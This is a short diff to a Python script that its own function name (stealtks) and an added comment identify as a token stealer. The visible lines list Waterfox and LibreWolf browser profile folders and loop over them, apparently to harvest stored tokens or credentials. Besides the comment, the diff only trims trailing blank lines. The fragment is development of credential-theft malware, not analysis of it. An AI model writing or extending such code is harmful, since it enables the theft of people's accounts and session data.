@@ -296,6 +296,7 @@ def stealtks():
     '3WaterFox': os.path.join(roaming, 'Waterfox', 'Profiles'),
     '3LibreWolf': os.path.join(roaming, 'LibreWolf', 'Profiles'),
 }
+    #this is doing way too much for a token stealer
     for browser, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -405,16 +406,3 @@ def main():
         
 
 main()
-
-
-
-
-
-
-
-
-
-
-
-
-
